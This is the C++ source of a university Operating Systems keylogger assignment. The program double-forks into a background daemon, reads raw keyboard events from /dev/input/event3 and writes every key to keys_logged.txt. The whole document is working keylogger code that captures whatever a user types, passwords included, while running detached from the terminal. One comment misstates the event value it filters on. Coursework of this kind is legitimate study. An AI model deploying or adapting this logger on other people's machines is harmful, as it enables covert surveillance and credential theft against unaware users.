// Operating Systems - CS444
// Spring 2023
// Sophia Carlone
// Keylogger Assignment
/* Description:
This program records the keys the user presses and places them in a file. 
The keys are taken from an event file
*/
// April 2nd, 2023
// Video link

#include <iostream>
#include <fstream>
#include <linux/input.h> //for input event 
#include <unistd.h> //for read()
#include <sys/stat.h>
#include <fcntl.h> //for O_RDONLY
#include <vector>

using namespace std;

vector<string> keycodes = {
        "RESERVED",
        "ESC",
        "1",
        "2",
        "3",
        "4",
        "5",
        "6",
        "7",
        "8",
        "9",
        "0",
        "MINUS",
        "EQUAL",
        "BACKSPACE",
        "TAB",
        "Q",
        "W",
        "E",
        "R",
        "T",
        "Y",
        "U",
        "I",
        "O",
        "P",
        "LEFTBRACE",
        "RIGHTBRACE",
        "ENTER",
        "LEFTCTRL",
        "A",
        "S",
        "D",
        "F",
        "G",
        "H",
        "J",
        "K",
        "L",
        "SEMICOLON",
        "APOSTROPHE",
        "GRAVE",
        "LEFTSHIFT",
        "BACKSLASH",
        "Z",
        "X",
        "C",
        "V",
        "B",
        "N",
        "M",
        "COMMA",
        "DOT",
        "SLASH",
        "RIGHTSHIFT",
        "KPASTERISK",
        "LEFTALT",
        "SPACE",
        "CAPSLOCK",
        "F1",
        "F2",
        "F3",
        "F4",
        "F5",
        "F6",
        "F7",
        "F8",
        "F9",
        "F10",
        "NUMLOCK",
        "SCROLLLOCK"
};

int main(){
    //fork off from parent process
    pid_t pid = fork();
    if (pid < 0) //failure checking
        exit(EXIT_FAILURE);

    if (pid > 0) //exit parent
        exit(EXIT_SUCCESS);

    //new session for child
    if(setsid() < 0)
        exit(EXIT_FAILURE);

    //forking again
    pid = fork();
    if (pid < 0) //failure checking
        exit(EXIT_FAILURE);

    if (pid > 0) //exit parent
        exit(EXIT_SUCCESS);

    //keylogging and file operations
    ofstream out;
    string filename = "keys_logged.txt";
    int in = open("/dev/input/event3", O_RDONLY); //open event file
    
    if (in == -1){ //catching failures with event file
        cout << "problem opening event file" << endl;
        exit(1);
    }

    struct input_event ev; //for keyboard events

    out.open(filename); //open file

    if(out.fail()){ //catch any failures
        cout << "problem opening file" << endl;
        exit(1);
    }

    /*dont need to use threads because people can really only really give one keyboard input at a time
    *even if you try to press at the same time there is a slight difference. */

    while(true){
        read(in, &ev, sizeof(ev)); //read event file to event structure
        if((ev.type == EV_KEY) && (ev.value == 0)){ //EV_KEY means keyboard and a 0 value is a keypress
            out << keycodes[ev.code] << endl; //print to file
        }
   }

   out.close();
}
